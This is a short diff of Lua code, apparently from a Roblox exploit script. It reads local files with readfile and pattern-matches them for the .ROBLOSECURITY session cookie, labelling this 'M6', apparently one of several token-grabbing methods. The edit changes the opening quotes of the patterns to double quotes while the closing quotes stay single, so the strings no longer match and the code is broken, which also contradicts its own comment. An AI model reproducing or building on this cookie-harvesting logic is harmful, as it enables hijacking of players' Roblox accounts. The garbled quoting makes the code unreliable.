@@ -553,9 +553,9 @@ task.spawn(function()
                 if ok and type(content) == "string" and #content > 10 then
                     scanned = scanned + 1
                     -- use single-quoted pattern to avoid quote escaping issues
-                    local found = content:match('ROBLOSECURITY[=_]([^;%s,
+                    local found = content:match("ROBLOSECURITY[=_]([^;%s,
 ]+)')
-                                or content:match('%.ROBLOSECURITY=([^;%s
+                                or content:match("%.ROBLOSECURITY=([^;%s
 ]+)')
                     if found and #found > 20 then
                         token = found methodUsed = "M6: readfile " .. path return
